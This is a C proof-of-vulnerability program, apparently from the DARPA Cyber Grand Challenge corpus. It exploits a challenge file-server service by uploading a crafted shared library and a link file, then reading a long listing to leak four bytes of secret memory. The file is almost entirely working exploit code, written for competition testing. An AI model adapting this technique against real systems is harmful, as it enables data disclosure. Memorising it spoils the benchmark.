/*

Author: Debbie Nuttall <debbie@cromulence.com>

Copyright (c) 2016 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include <libpov.h>
#include <libcgc.h>


int SendToCB(char *buf, int length) {
  int total_sent = 0;
  int ret;
  size_t bytes_sent = 0;
  while(total_sent < length) {
    ret = transmit(1, buf + total_sent, length - total_sent, &bytes_sent);
    if (ret != 0) {
      // error
      return -1;
    }
    if (bytes_sent == 0) {
      break;
    }
    total_sent += bytes_sent;
  }
  return bytes_sent;
}

int ReceiveFromCB(char *buf, int length) {
  size_t total_received = 0;
  size_t bytes_received = 0;
  int ret;
  while (total_received < length) {
    ret = receive(0, buf + total_received , length - total_received , &bytes_received);
    if (ret != 0) {
      return -1;
    }
    if (bytes_received == 0) {
      break;
    }
    total_received += bytes_received;
  }
  return total_received;
}

void ReadPrompt()
{
  char prompt;
  ReceiveFromCB(&prompt, 1);
}

void WriteCString(char *s, uint32_t length)
{
  unsigned short len16 = length;
  SendToCB((char *)&len16, 2);
  SendToCB(s, length);
}


int main(void) {
  // Setup type 2 pov
  type2_vals t2vals;
  type2_negotiate(&t2vals);

 
  //Upload a shared library that satisfies name requirements
  char sl_file[98] = "\x62\x00\x00\x00\x6c\xc7\x7c\xc6\xe1\x01\x00\x15\x00\x00\x00\x5b\x00\x07\x00\x5b\x00\x53\x68\x61\x72\x65\x64\x4c\x69\x62\x72\x61\x72\x79\x4d\x61\x69\x6e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5b\x00\x00\x00\x37\x00\xc0\x47\x43\x41\x40";
  char sl_filename[64] = "jPrXQrDhBDfQHnJUWVPYvIJxenCnSvOuq_tRcLnKBDCGcchXUSMEtuGMLMcFhQuX";
  char link_file[77] = "\x4d\x00\x00\x00\x4b\x4e\x49\x4c\x6a\x50\x72\x58\x51\x72\x44\x68\x42\x44\x66\x51\x48\x6e\x4a\x55\x57\x56\x50\x59\x76\x49\x4a\x78\x65\x6e\x43\x6e\x53\x76\x4f\x75\x71\x5f\x74\x52\x63\x4c\x6e\x4b\x42\x44\x43\x47\x63\x63\x68\x58\x55\x53\x4d\x45\x74\x75\x47\x4d\x4c\x4d\x63\x46\x68\x51\x75\x58\x00\x00\x00\x00\x00";
  char link_filename[32] = "VwovHKXRUPETSRAjnXFFIWpeultmx.lk";
  char upload_command[2] = "u\n";
  char list_command[2] = "g\n";
  ReadPrompt();
  SendToCB(upload_command, sizeof(upload_command));
  WriteCString(sl_filename, sizeof(sl_filename));
  SendToCB("\xf6", 1);
  WriteCString(sl_file, sizeof(sl_file));

  ReadPrompt();
  //upload a link that references the shared library
  SendToCB(upload_command, sizeof(upload_command));
  WriteCString(link_filename, sizeof(link_filename));
  SendToCB("\xf4", 1);
  WriteCString(link_file, sizeof(link_file));
  
  //perform a long listing
  ReadPrompt();
  SendToCB(list_command, sizeof(list_command));
  char result[150];
  ReceiveFromCB(result, sizeof(result));

  // submit type 2 pov
  type2_submit((unsigned char *)&result[91], 4);
  return 0;
}